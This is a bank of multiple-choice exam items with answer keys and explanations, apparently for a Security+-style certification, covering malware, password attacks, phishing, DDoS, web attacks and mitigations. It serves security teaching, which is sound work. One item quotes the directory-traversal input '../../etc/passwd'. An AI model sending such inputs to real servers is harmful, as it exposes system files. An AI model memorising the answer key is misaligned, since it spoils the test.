  { id:"D2-068", domain:2, obj:"2.4", diff:"easy", q:"Which malware lies dormant until a specific condition or date triggers its malicious payload?", options:["Worm","Adware","Trojan","Logic bomb"], answer:3, explain:"<strong>Logic bomb</strong> executes its malicious payload only when a defined condition is met, such as a specific date or event.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Worm</b>: a worm spreads automatically across networks, it does not lie dormant awaiting a trigger condition.</span><span class='qd'><b>Adware</b>: adware displays unwanted ads immediately, it is not conditionally triggered dormant malware.</span><span class='qd'><b>Trojan</b>: a Trojan acts once a user runs the disguised program, not specifically when a future condition or date is reached.</span>" },
  { id:"D2-069", domain:2, obj:"2.4", diff:"easy", q:"Precomputed tables of hashes used to reverse hashed passwords quickly are known as:", options:["Rainbow tables","Lookup caches","Hash chains","Salt tables"], answer:0, explain:"<strong>Rainbow tables</strong> store precomputed hash-to-plaintext mappings to speed up cracking of unsalted password hashes.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Salt tables</b>: this is not a real attack tool, and salting actually defends against precomputed-hash attacks by making each hash unique.</span><span class='qd'><b>Lookup caches</b>: a lookup cache is a generic performance store, not the cryptographic precomputed-hash structure used to reverse passwords.</span><span class='qd'><b>Hash chains</b>: hash chains are an internal building block of rainbow tables, but the named attack artifact itself is the rainbow table.</span>" },
  { id:"D2-070", domain:2, obj:"2.4", diff:"easy", q:"Malware that self-replicates and spreads across networks without user interaction is a:", options:["Virus","Worm","Trojan","Rootkit"], answer:1, explain:"<strong>Worm</strong> propagates automatically across networks by exploiting vulnerabilities, without needing a host file or user action.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Virus</b>: a virus attaches to a host file and requires the user to execute it to spread, unlike a self-propagating worm.</span><span class='qd'><b>Trojan</b>: a Trojan relies on a user running disguised software, it does not self-replicate across networks.</span><span class='qd'><b>Rootkit</b>: a rootkit conceals privileged access, its purpose is stealth rather than autonomous network spreading.</span>" },
  { id:"D2-071", domain:2, obj:"2.4", diff:"medium", q:"Users report that visiting their bank's correct URL still lands them on a fraudulent site. Investigation shows the local hosts file was modified. Which attack is MOST likely?", options:["Brute force","Phishing email","Pharming","SQL injection"], answer:2, explain:"<strong>Pharming</strong> redirects users from a legitimate URL to a malicious site, here by modifying the local hosts file so the correct address resolves to the attacker.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Phishing email</b>: phishing relies on the user clicking a deceptive link, but here the user typed the correct URL and was still redirected.</span><span class='qd'><b>SQL injection</b>: SQL injection manipulates a backend database, it does not alter name resolution or the hosts file.</span><span class='qd'><b>Brute force</b>: brute force guesses credentials, it has nothing to do with redirecting a correct URL to a fake site.</span>" },
  { id:"D2-072", domain:2, obj:"2.4", diff:"medium", q:"An attacker forces a TLS connection to fall back from TLS 1.3 to SSL 3.0 to exploit a weakness. This is a(n):", options:["Collision attack","On-path attack","Replay attack","Downgrade attack"], answer:3, explain:"<strong>Downgrade attack</strong> forces parties to negotiate a weaker, vulnerable protocol or cipher, such as falling back from TLS 1.3 to SSL 3.0, than they would normally use.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Replay attack</b>: a replay attack resends captured valid data, it does not force a weaker protocol version.</span><span class='qd'><b>Collision attack</b>: a collision attack finds two inputs with the same hash, unrelated to negotiating a protocol version.</span><span class='qd'><b>On-path attack</b>: an on-path attack may enable a downgrade, but the specific act of forcing the weaker protocol is itself the downgrade attack.</span>" },
  { id:"D2-073", domain:2, obj:"2.4", diff:"medium", q:"Two different inputs produce the same hash value, undermining the integrity guarantee of the algorithm. This describes a:", options:["Collision attack","Salting failure","Key stretching flaw","Birthday paradox only"], answer:0, explain:"<strong>Collision attack</strong> finds two distinct inputs that hash to the same value, breaking the integrity assurance of the hash function.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Birthday paradox only</b>: the birthday paradox is the probability principle that makes collisions feasible, but the exploitation itself is the collision attack.</span><span class='qd'><b>Salting failure</b>: salting concerns password storage uniqueness, not two arbitrary inputs producing the same hash.</span><span class='qd'><b>Key stretching flaw</b>: key stretching slows brute-force guessing of passwords, it is unrelated to two inputs sharing a hash value.</span>" },
  { id:"D2-074", domain:2, obj:"2.4", diff:"medium", q:"A security tool flags a process that injects itself into <code class='mono'>explorer.exe</code> and beacons to an external IP every 60 seconds. Which indicator category does the beaconing represent?", options:["Account lockout","Command-and-control traffic","Resource consumption","Impossible travel"], answer:1, explain:"<strong>Command-and-control traffic</strong> is indicated by regular outbound beaconing to an external host, a classic sign of malware contacting its C2 server.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Account lockout</b>: account lockout is an authentication indicator from repeated failed logins, not a beaconing process.</span><span class='qd'><b>Resource consumption</b>: resource consumption refers to abnormal CPU, memory, or disk usage, not periodic outbound network calls.</span><span class='qd'><b>Impossible travel</b>: impossible travel involves geographically inconsistent logins, not a process beaconing to an external IP.</span>" },
  { id:"D2-075", domain:2, obj:"2.4", diff:"medium", q:"An attacker tries every possible combination of characters against a single password hash offline. Which attack is this?", options:["Replay attack","Password spraying","Brute-force attack","Pharming"], answer:2, explain:"<strong>Brute-force attack</strong> systematically attempts every possible character combination until the correct password is found, here offline against a single hash.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Password spraying</b>: password spraying tries one common password across many accounts, not every combination against one hash.</span><span class='qd'><b>Pharming</b>: pharming redirects users to malicious sites, it is not a password-cracking technique.</span><span class='qd'><b>Replay attack</b>: a replay attack reuses captured valid data, it does not exhaustively guess all combinations.</span>" },
  { id:"D2-076", domain:2, obj:"2.4", diff:"medium", q:"Stolen username/password pairs from one breach are automatically tested against logins on other sites. This attack is called:", options:["Dictionary attack","Rainbow table attack","Brute force","Credential stuffing"], answer:3, explain:"<strong>Credential stuffing</strong> reuses leaked username and password pairs across many services, exploiting victims who reuse passwords.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Dictionary attack</b>: a dictionary attack guesses passwords from a wordlist, it does not use known valid pairs from a breach.</span><span class='qd'><b>Rainbow table attack</b>: a rainbow table reverses password hashes offline, not test already-known credential pairs against logins.</span><span class='qd'><b>Brute force</b>: brute force tries all combinations, whereas credential stuffing reuses specific stolen pairs.</span>" },
  { id:"D2-077", domain:2, obj:"2.4", diff:"medium", q:"A web form lets a user submit <code class='mono'>../../etc/passwd</code> and the server returns file contents. Which attack succeeded?", options:["Directory traversal","SQL injection","Buffer overflow","Cross-site scripting"], answer:0, explain:"<strong>Directory traversal</strong> uses sequences like ../ to access files outside the intended web directory, here exposing the system password file.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Cross-site scripting</b>: XSS injects browser-executed script, it does not retrieve server files via path manipulation.</span><span class='qd'><b>SQL injection</b>: SQL injection targets the database through crafted query input, not the file system path.</span><span class='qd'><b>Buffer overflow</b>: a buffer overflow corrupts memory to alter execution, it does not read arbitrary files via ../ sequences.</span>" },
  { id:"D2-078", domain:2, obj:"2.4", diff:"medium", q:"Remote-access malware that gives an attacker full interactive control of an infected host is best described as a:", options:["Logic bomb","RAT","Worm","Keylogger"], answer:1, explain:"<strong>RAT</strong>, a remote access Trojan, provides covert, interactive remote control of a compromised machine.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Worm</b>: a worm self-replicates across networks, it does not give an attacker interactive control of a host.</span><span class='qd'><b>Keylogger</b>: a keylogger only records keystrokes, it does not provide full interactive remote control.</span><span class='qd'><b>Logic bomb</b>: a logic bomb releases a payload on a trigger condition, it is not a remote-control tool.</span>" },
  { id:"D2-079", domain:2, obj:"2.4", diff:"medium", q:"Which indicator MOST strongly suggests an account has been compromised through a remote attack?", options:["A password change from the user's own laptop","A single late-night successful login from the corporate VPN","A login from a country the user has never visited minutes after a local login","A failed login at lunchtime"], answer:2, explain:"<strong>A login from a country the user has never visited minutes after a local login</strong> is impossible travel, a strong indicator of credential compromise because one user cannot be in two distant places at once.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A failed login at lunchtime</b>: a single failed login is routine and easily explained by a typo, not a strong compromise signal.</span><span class='qd'><b>A password change from the user's own laptop</b>: a change from the user's known device is expected normal behavior, not an indicator of attack.</span><span class='qd'><b>A single late-night successful login from the corporate VPN</b>: an authorized VPN login, even late, is plausible legitimate remote work, not impossible travel.</span>" },
  { id:"D2-080", domain:2, obj:"2.4", diff:"medium", q:"An attacker sends a victim a link that, when clicked while logged into their bank, silently submits a funds-transfer request. Which attack is this?", options:["Stored XSS","SQL injection","Session fixation","Cross-site request forgery (CSRF)"], answer:3, explain:"<strong>Cross-site request forgery (CSRF)</strong> tricks an authenticated user's browser into submitting an unwanted request, here a funds transfer, using their active session.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Stored XSS</b>: stored XSS persists malicious script on the server to run in browsers, the scenario instead abuses an existing session via a crafted link.</span><span class='qd'><b>SQL injection</b>: SQL injection manipulates the database through input, not ride an authenticated browser session to submit a request.</span><span class='qd'><b>Session fixation</b>: session fixation forces a victim to use an attacker-set session ID before login, not submit a request under the victim's own active session.</span>" },
  { id:"D2-081", domain:2, obj:"2.4", diff:"medium", q:"A targeted phishing email is crafted specifically for a company's CFO, referencing real projects. This is BEST described as:", options:["Whaling","Spear phishing","Smishing","Vishing"], answer:0, explain:"<strong>Whaling</strong> is spear phishing aimed specifically at high-value executives such as a CFO or CEO, matching this email crafted for the CFO.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Spear phishing</b>: spear phishing is targeted phishing in general, but when the target is a senior executive the more precise term is whaling.</span><span class='qd'><b>Smishing</b>: smishing is phishing delivered by SMS text, whereas this scenario is an email.</span><span class='qd'><b>Vishing</b>: vishing is voice phishing over a phone call, not a crafted email to an executive.</span>" },
  { id:"D2-082", domain:2, obj:"2.4", diff:"medium", q:"A user gets an SMS text claiming a package delivery failed and asking them to click a link to reschedule. This social-engineering technique is:", options:["Vishing","Smishing","Pharming","Tailgating"], answer:1, explain:"<strong>Smishing</strong> is phishing conducted over SMS text messages, such as a fake package-delivery text with a malicious link.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Vishing</b>: vishing is phishing carried out by voice phone call, not an SMS text.</span><span class='qd'><b>Pharming</b>: pharming redirects users to fraudulent sites via DNS or hosts-file tampering, not a deceptive text message.</span><span class='qd'><b>Tailgating</b>: tailgating is following someone through a physical door without authorization, unrelated to SMS phishing.</span>" },
  { id:"D2-083", domain:2, obj:"2.4", diff:"medium", q:"An attacker calls an employee pretending to be from the bank's fraud department to extract account details over the phone. This is:", options:["Whaling","Pretexting only","Vishing","Smishing"], answer:2, explain:"<strong>Vishing</strong> is voice phishing carried out over a phone call to manipulate the victim into divulging information.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Smishing</b>: smishing is phishing via SMS text, not a live phone call.</span><span class='qd'><b>Whaling</b>: whaling targets senior executives, typically by email, not a phone call posing as fraud department.</span><span class='qd'><b>Pretexting only</b>: pretexting is the fabricated story used here, but the specific delivery over a voice call makes this vishing.</span>" },
  { id:"D2-084", domain:2, obj:"2.4", diff:"medium", q:"Application logs show thousands of failed logins for one account followed by a success. Which indicator does this represent?", options:["Out-of-cycle logging","Missing logs","Concurrent session usage","Brute-force / account lockout indicator"], answer:3, explain:"<strong>Brute-force / account lockout indicator</strong> is shown by thousands of failed logins on one account followed by a success, a classic compromise pattern.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Concurrent session usage</b>: concurrent sessions involve one account active in multiple places at once, not a burst of failed then successful logins.</span><span class='qd'><b>Out-of-cycle logging</b>: out-of-cycle logging is log entries appearing at unusual times, not repeated failed authentication attempts.</span><span class='qd'><b>Missing logs</b>: missing logs means expected entries are absent, but here many failure entries are present and visible.</span>" },
  { id:"D2-085", domain:2, obj:"2.4", diff:"medium", q:"Which attack uses a list of likely words and common passwords rather than every possible combination?", options:["Dictionary attack","Rainbow table","Spraying","Brute force"], answer:0, explain:"<strong>Dictionary attack</strong> tries entries from a wordlist of likely passwords, faster than exhaustive brute force.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Brute force</b>: brute force tries every possible character combination, not just a curated list of likely words.</span><span class='qd'><b>Rainbow table</b>: a rainbow table reverses captured hashes using precomputed values, it does not submit guessed words at login.</span><span class='qd'><b>Spraying</b>: password spraying tries one common password across many accounts, not many wordlist entries against a target.</span>" },
  { id:"D2-086", domain:2, obj:"2.4", diff:"medium", q:"Malware embedded in firmware or the boot process that persists across OS reinstalls is MOST consistent with a:", options:["Adware","Bootkit / firmware rootkit","Macro virus","Logic bomb"], answer:1, explain:"<strong>Bootkit / firmware rootkit</strong> infects the boot path or firmware, surviving OS reinstallation and evading typical detection.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Adware</b>: adware displays unwanted ads at the application level, it does not embed in firmware or persist across reinstalls.</span><span class='qd'><b>Macro virus</b>: a macro virus lives in document macros and is removed when the OS or files are wiped, it does not survive in firmware.</span><span class='qd'><b>Logic bomb</b>: a logic bomb is condition-triggered code, not malware embedded in the boot process for persistence.</span>" },
  { id:"D2-087", domain:2, obj:"2.4", diff:"medium", q:"A flood of half-open TCP connections exhausts a server's connection table. Which DDoS technique is this?", options:["Smurf attack","Slowloris","SYN flood","DNS amplification"], answer:2, explain:"<strong>SYN flood</strong> sends many SYN packets without completing the TCP handshake, exhausting the server's half-open connection state table.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>DNS amplification</b>: DNS amplification uses spoofed small queries to elicit large responses against a victim, not half-open TCP connections.</span><span class='qd'><b>Smurf attack</b>: a smurf attack floods a victim with ICMP echo replies via a broadcast address, not TCP SYN handshakes.</span><span class='qd'><b>Slowloris</b>: Slowloris holds connections open with slow partial HTTP requests, it does not flood with half-open SYNs.</span>" },
  { id:"D2-088", domain:2, obj:"2.4", diff:"medium", q:"An attacker spoofs a small DNS query that triggers a large response sent to the victim's address. This amplification attack abuses:", options:["Replay","On-path","Collision","Reflected/amplified DDoS"], answer:3, explain:"<strong>Reflected/amplified DDoS</strong> spoofs the victim's source address so servers send large responses to the victim, multiplying the attack traffic.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Replay</b>: a replay attack reuses captured valid data to impersonate a sender, it does not amplify spoofed queries into a flood.</span><span class='qd'><b>On-path</b>: an on-path attack intercepts traffic between two parties, not reflect amplified responses at a victim.</span><span class='qd'><b>Collision</b>: a collision is two inputs sharing a hash value, completely unrelated to network amplification.</span>" },
  { id:"D2-089", domain:2, obj:"2.4", diff:"medium", q:"Sudden spikes in CPU, memory, or disk on a host with no corresponding business activity are BEST classified as which indicator?", options:["Resource consumption / inutilization","Impossible travel","Missing logs","Published indicators"], answer:0, explain:"<strong>Resource consumption / inutilization</strong> describes abnormal CPU, memory, or disk spikes without business cause, which can indicate cryptomining, malware, or denial-of-service activity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Impossible travel</b>: impossible travel is a login-location anomaly, not a spike in host resource usage.</span><span class='qd'><b>Missing logs</b>: missing logs indicate absent expected entries, not elevated resource consumption.</span><span class='qd'><b>Published indicators</b>: published indicators are externally shared IOCs from threat intelligence, not internally observed resource spikes.</span>" },
  { id:"D2-090", domain:2, obj:"2.4", diff:"medium", q:"Which malware indicator describes log entries that should exist but are absent, suggesting tampering?", options:["Out-of-cycle logging","Missing logs","Concurrent sessions","Blocked content"], answer:1, explain:"<strong>Missing logs</strong> are an indicator that an attacker may have cleared entries to hide activity, since records that should exist are absent.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Out-of-cycle logging</b>: out-of-cycle logging is entries appearing at unexpected times, not entries that are missing entirely.</span><span class='qd'><b>Concurrent sessions</b>: concurrent sessions involve one account active in multiple places, unrelated to absent log entries.</span><span class='qd'><b>Blocked content</b>: blocked content is a control preventing access to data, not the absence of expected log records.</span>" },
  { id:"D2-091", domain:2, obj:"2.4", diff:"medium", q:"A program that displays unwanted advertisements and may track browsing habits is classified as:", options:["Worm","Rootkit","Adware","Ransomware"], answer:2, explain:"<strong>Adware</strong> displays unwanted advertisements and may collect browsing data, and it is often bundled with free software.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Ransomware</b>: ransomware encrypts data and demands payment, it does not simply display ads.</span><span class='qd'><b>Worm</b>: a worm self-replicates across networks, it is not defined by showing advertisements.</span><span class='qd'><b>Rootkit</b>: a rootkit conceals privileged access from the OS, not display unwanted ads.</span>" },
  { id:"D2-092", domain:2, obj:"2.4", diff:"hard", q:"Users on a wireless network are silently redirected through an attacker's device that strips HTTPS to HTTP before forwarding. Which two techniques BEST describe this?", options:["Replay attack with collision","DDoS with amplification","CSRF with session fixation","On-path attack with SSL stripping (downgrade)"], answer:3, explain:"<strong>On-path attack with SSL stripping (downgrade)</strong> describes the attacker intercepting traffic and forcing connections from HTTPS down to unencrypted HTTP before forwarding.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Replay attack with collision</b>: replay resends captured data and collision concerns hashing, neither describes intercepting and downgrading live web traffic.</span><span class='qd'><b>DDoS with amplification</b>: this floods a target to deny availability, it does not silently strip encryption from a user's traffic.</span><span class='qd'><b>CSRF with session fixation</b>: these abuse web sessions through crafted requests or forced session IDs, not network interception and HTTPS stripping.</span>" },
  { id:"D2-093", domain:2, obj:"2.4", diff:"hard", q:"An attacker reuses a captured Kerberos authentication ticket to access a service without knowing the password. Which attack family does this MOST closely match?", options:["Replay attack","Brute force","Rainbow table","Downgrade"], answer:0, explain:"<strong>Replay attack</strong> best matches reusing a captured Kerberos ticket to access a service, since the attacker resends valid authentication material; timestamps and nonces mitigate it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Brute force</b>: brute force guesses the password by trying combinations, but here no password is guessed, the ticket is reused.</span><span class='qd'><b>Rainbow table</b>: a rainbow table reverses password hashes offline, it does not reuse a captured authentication ticket.</span><span class='qd'><b>Downgrade</b>: a downgrade forces a weaker protocol, it does not replay a captured ticket.</span>" },
  { id:"D2-094", domain:2, obj:"2.4", diff:"hard", q:"A penetration tester finds that submitting a single quote into a login field returns a database syntax error. Which follow-up attack is MOST likely to succeed, and what is the FIRST defense to recommend?", options:["Traversal; recommend input path canonicalization","SQL injection; recommend parameterized queries","XSS; recommend output encoding","CSRF; recommend anti-CSRF tokens"], answer:1, explain:"<strong>SQL injection; recommend parameterized queries</strong> is correct because a database syntax error from a single quote signals injectable input, and parameterized (prepared) statements are the primary defense.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>XSS; recommend output encoding</b>: a database syntax error points to SQL injection, not script execution in a browser that output encoding would address.</span><span class='qd'><b>CSRF; recommend anti-CSRF tokens</b>: CSRF abuses an authenticated session, it would not produce a database syntax error from a quote.</span><span class='qd'><b>Traversal; recommend input path canonicalization</b>: directory traversal manipulates file paths, it would not trigger a SQL syntax error in the database.</span>" },
  { id:"D2-095", domain:2, obj:"2.4", diff:"hard", q:"Comparing collision resistance, which scenario represents the GREATEST cryptographic risk?", options:["Hashing passwords with bcrypt and a salt","Using SHA-256 for file integrity","A CA still signing certificates with MD5","Using AES-256 in GCM mode"], answer:2, explain:"<strong>A CA still signing certificates with MD5</strong> is the greatest risk because MD5 is broken for collision resistance, allowing forged certificates that chain to a trusted authority.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Using AES-256 in GCM mode</b>: AES-256-GCM is a strong, recommended authenticated encryption choice, not a cryptographic weakness.</span><span class='qd'><b>Hashing passwords with bcrypt and a salt</b>: bcrypt with a salt is a sound modern password-storage practice, not a risk.</span><span class='qd'><b>Using SHA-256 for file integrity</b>: SHA-256 remains collision resistant and is appropriate for integrity verification.</span>" },
  { id:"D2-096", domain:2, obj:"2.4", diff:"hard", q:"A malware sample changes its code on each infection to avoid signature detection while keeping the same function. This is BEST described as:", options:["Logic bomb","Fileless macro","Bloatware","Polymorphic malware"], answer:3, explain:"<strong>Polymorphic malware</strong> mutates its code and signature on each propagation while keeping the same function, evading signature-based antivirus detection.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Logic bomb</b>: a logic bomb triggers on a condition, it does not change its own code to dodge signatures.</span><span class='qd'><b>Fileless macro</b>: a fileless or macro threat runs in memory or document macros, but that does not describe changing code on each infection.</span><span class='qd'><b>Bloatware</b>: bloatware is unnecessary preinstalled software, it is not self-mutating malware.</span>" },
  { id:"D2-097", domain:2, obj:"2.4", diff:"hard", q:"Stored XSS and reflected XSS differ MOST significantly in that stored XSS:", options:["Persists on the server and affects all who view the page","Requires the victim to click a crafted link each time","Cannot steal session cookies","Only works against the same-origin attacker"], answer:0, explain:"<strong>Persists on the server and affects all who view the page</strong> is correct because stored XSS saves the malicious script on the server, so it executes for every user who loads the affected content.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Requires the victim to click a crafted link each time</b>: that describes reflected XSS, not stored XSS, which needs no per-victim link.</span><span class='qd'><b>Cannot steal session cookies</b>: stored XSS can steal session cookies just as reflected XSS can, so this is false.</span><span class='qd'><b>Only works against the same-origin attacker</b>: XSS executes in the victim's origin to harm the victim, this phrasing is not a real distinguishing property.</span>" },
  { id:"D2-098", domain:2, obj:"2.4", diff:"hard", q:"An attacker exploits a buffer overflow to overwrite the return address and execute injected shellcode. Which mitigation FIRST and MOST directly disrupts this technique?", options:["Rate limiting","Data Execution Prevention (DEP/NX)","Account lockout policy","Network segmentation"], answer:1, explain:"<strong>Data Execution Prevention (DEP/NX)</strong> marks data regions non-executable, directly preventing execution of injected shellcode placed on the stack or heap.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Account lockout policy</b>: account lockout limits password-guessing attempts, it does nothing to stop in-memory shellcode execution.</span><span class='qd'><b>Network segmentation</b>: segmentation limits lateral movement between zones, it does not prevent code execution within a single exploited process.</span><span class='qd'><b>Rate limiting</b>: rate limiting throttles request volume, it does not block executing injected code in a buffer overflow.</span>" },
  { id:"D2-099", domain:2, obj:"2.4", diff:"hard", q:"Memory-resident malware that runs entirely in RAM using legitimate tools like PowerShell, leaving little disk footprint, is BEST described as:", options:["Bootkit","Adware","Fileless malware","Macro virus"], answer:2, explain:"<strong>Fileless malware</strong> operates in memory and abuses living-off-the-land binaries like PowerShell, leaving little disk footprint for file-based scanners to detect.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Macro virus</b>: a macro virus resides in document macros on disk, it is not memory-resident and file-light.</span><span class='qd'><b>Bootkit</b>: a bootkit persists in the boot path or firmware on disk, the opposite of running purely in RAM.</span><span class='qd'><b>Adware</b>: adware is installed software that displays ads, not memory-only living-off-the-land malware.</span>" },
  { id:"D2-100", domain:2, obj:"2.4", diff:"hard", q:"A salted password store is breached. Why does the salt MOST effectively defeat precomputed rainbow tables?", options:["It encrypts the password with a symmetric key","It hides the username from the attacker","It increases password length requirements","It makes each hash unique, invalidating shared precomputation"], answer:3, explain:"<strong>It makes each hash unique, invalidating shared precomputation</strong> is correct because a unique random salt per password means an attacker cannot reuse one precomputed table across accounts.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It encrypts the password with a symmetric key</b>: a salt is not encryption and uses no key, it is appended random data before hashing.</span><span class='qd'><b>It hides the username from the attacker</b>: a salt does not conceal usernames, and salts are typically stored alongside the hash.</span><span class='qd'><b>It increases password length requirements</b>: a salt does not change policy on user password length, it diversifies the stored hash.</span>" },
  { id:"D2-101", domain:2, obj:"2.5", diff:"easy", q:"Dividing a network into smaller isolated zones to limit lateral movement is called:", options:["Segmentation","Patching","Encryption","Decommissioning"], answer:0, explain:"<strong>Segmentation</strong> isolates systems into zones, containing breaches and limiting an attacker's lateral movement.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Patching</b>: patching fixes known vulnerabilities in software, it does not partition the network into isolated zones.</span><span class='qd'><b>Encryption</b>: encryption protects data confidentiality, it does not divide the network to limit movement.</span><span class='qd'><b>Decommissioning</b>: decommissioning securely retires systems and media, not create isolated network zones.</span>" },
  { id:"D2-102", domain:2, obj:"2.5", diff:"easy", q:"Granting users only the permissions required to perform their job is the principle of:", options:["Implicit deny","Least privilege","Defense in depth","Separation of duties"], answer:1, explain:"<strong>Least privilege</strong> limits each account's access to the minimum needed, reducing the impact of compromise or misuse.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Defense in depth</b>: defense in depth layers multiple controls, it is broader than restricting a user's permissions to job needs.</span><span class='qd'><b>Separation of duties</b>: separation of duties splits a sensitive task across people to prevent fraud, not limit one account's permissions.</span><span class='qd'><b>Implicit deny</b>: implicit deny blocks anything not explicitly allowed, a rule-processing default rather than the minimum-permission principle.</span>" },
  { id:"D2-103", domain:2, obj:"2.5", diff:"easy", q:"Applying vendor updates to fix known software vulnerabilities is known as:", options:["Monitoring","Hardening","Patching","Isolation"], answer:2, explain:"<strong>Patching</strong> applies vendor updates to remediate known vulnerabilities before attackers can exploit them.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hardening</b>: hardening reduces attack surface by disabling services and accounts, it is broader than applying specific vendor fixes.</span><span class='qd'><b>Isolation</b>: isolation quarantines a host from the network, it does not apply software updates.</span><span class='qd'><b>Monitoring</b>: monitoring observes activity to detect issues, it does not remediate vulnerabilities with updates.</span>" },
  { id:"D2-104", domain:2, obj:"2.5", diff:"easy", q:"Disabling unnecessary services, closing unused ports, and removing default accounts is part of:", options:["Network segmentation","Data decommissioning","Encryption at rest","System hardening"], answer:3, explain:"<strong>System hardening</strong> reduces a system's attack surface by removing unneeded services, ports, accounts, and software.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Network segmentation</b>: segmentation isolates the network into zones, it does not disable services or remove default accounts on a host.</span><span class='qd'><b>Data decommissioning</b>: decommissioning sanitizes media when retiring systems, not disable services on an active host.</span><span class='qd'><b>Encryption at rest</b>: encryption at rest protects stored data confidentiality, it does not close ports or remove unneeded services.</span>" },
  { id:"D2-105", domain:2, obj:"2.5", diff:"medium", q:"A compromised workstation is immediately moved to a quarantine VLAN to stop it from contacting other hosts. Which mitigation is being applied?", options:["Isolation","Configuration enforcement","Least privilege","Decommissioning"], answer:0, explain:"<strong>Isolation</strong> (quarantine) cuts off a suspect host from the rest of the network to contain the threat, as with a quarantine VLAN.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Configuration enforcement</b>: configuration enforcement applies and verifies security baselines, it does not quarantine a compromised host.</span><span class='qd'><b>Least privilege</b>: least privilege restricts account permissions, not network-isolate an infected machine.</span><span class='qd'><b>Decommissioning</b>: decommissioning permanently retires and sanitizes a system, not temporarily contain a live one.</span>" },
  { id:"D2-106", domain:2, obj:"2.5", diff:"medium", q:"Which control BEST ensures laptops automatically meet security baselines, such as encryption and screen-lock, before connecting?", options:["Threat hunting","Configuration enforcement","Manual audits","User training"], answer:1, explain:"<strong>Configuration enforcement</strong>, via tools like MDM, GPO, and posture checks, automatically applies and verifies security baselines such as encryption and screen-lock before a device connects.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Manual audits</b>: manual audits check compliance after the fact and are not automatic enforcement at connection time.</span><span class='qd'><b>User training</b>: training raises awareness but does not technically enforce baseline settings on the device.</span><span class='qd'><b>Threat hunting</b>: threat hunting proactively searches for hidden threats, it does not enforce configuration baselines.</span>" },
  { id:"D2-107", domain:2, obj:"2.5", diff:"medium", q:"When retiring old servers that stored sensitive data, which mitigation MOST directly prevents data exposure?", options:["Network segmentation","Least privilege","Secure decommissioning with media sanitization","Adding more monitoring"], answer:2, explain:"<strong>Secure decommissioning with media sanitization</strong> most directly prevents data exposure by sanitizing or destroying storage media so residual sensitive data cannot be recovered.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Adding more monitoring</b>: monitoring detects activity, it does not remove residual data from retired media.</span><span class='qd'><b>Network segmentation</b>: segmentation limits movement on a live network, it does not sanitize data on a retired server.</span><span class='qd'><b>Least privilege</b>: least privilege restricts access on active systems, not erase data from decommissioned drives.</span>" },
  { id:"D2-108", domain:2, obj:"2.5", diff:"medium", q:"Protecting data confidentiality both on disk and as it crosses the network is BEST achieved through:", options:["Patching only","Account lockout","Penetration testing","Encryption at rest and in transit"], answer:3, explain:"<strong>Encryption at rest and in transit</strong> protects confidentiality from both theft of storage media and interception of network traffic.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Patching only</b>: patching fixes vulnerabilities but does not by itself protect data confidentiality on disk and over the wire.</span><span class='qd'><b>Account lockout</b>: account lockout deters password guessing, it does not encrypt stored or transmitted data.</span><span class='qd'><b>Penetration testing</b>: penetration testing finds weaknesses, it does not actively protect data confidentiality.</span>" },
  { id:"D2-109", domain:2, obj:"2.5", diff:"hard", q:"After a ransomware incident, leadership wants to MOST reduce the blast radius of any future infection. Which mitigation should be prioritized FIRST?", options:["Network segmentation with least-privilege access between zones","Buying more antivirus licenses","Increasing password length","Adding a second firewall vendor"], answer:0, explain:"<strong>Network segmentation with least-privilege access between zones</strong> should come first because it limits lateral movement, directly shrinking how far ransomware can spread.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Buying more antivirus licenses</b>: more licenses do not contain spread once an infection bypasses signatures, the goal is limiting blast radius.</span><span class='qd'><b>Increasing password length</b>: longer passwords resist guessing but do not stop ransomware moving laterally after entry.</span><span class='qd'><b>Adding a second firewall vendor</b>: a second perimeter vendor adds diversity but does not segment internal zones to contain spread.</span>" },
